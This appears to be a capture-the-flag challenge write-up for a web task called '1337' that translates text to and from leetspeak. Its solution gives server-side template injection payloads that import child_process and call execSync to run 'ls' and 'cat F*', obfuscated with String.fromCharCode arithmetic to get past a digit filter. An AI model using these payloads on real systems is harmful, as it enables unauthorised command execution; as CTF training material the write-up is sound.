# 1337

**Category:** Web
**Difficulty:** Medium
**Author:** iCiaran

## Description

C0NV3R7 70/FR0M L337

## Distribution

- None (Maybe /source serving plain index.js)

## Deploy notes

docker compose

## Solution

- SSTI on input, eg `<%=7\*7%>
- TO is unusable (converts most vowels to numbers)
- FROM Only allows us to use the numbers 8,9 and 2
- Run `ls`
  - `await import('child_process').then((m) => { return m.execSync(String.fromCharCode('ls'));});`
  - `await import(String.fromCharCode(99,98+8-2,98+9-2,99+9,98+2,99-2-2,88+22+2,88+28-2,82+29,99,99+2,99+8+8,99+8+8)).then((m) => { return m.execSync(String.fromCharCode(99+9,99+8+8));});`
- Run some variation of `cat F*`
  - `await import('child_process').then((m) => { return m.execSync(String.fromCharCode('cat F*'));});`
  - `await import(String.fromCharCode(99,98+8-2,98+9-2,99+9,98+2,99-2-2,88+22+2,88+28-2,82+29,99,99+2,99+8+8,99+8+8)).then((m) => { return m.execSync(String.fromCharCode(99,99-2,99+9+8,8+8+8+8,88-8-8-2,9+9+9+9+8-2));});`
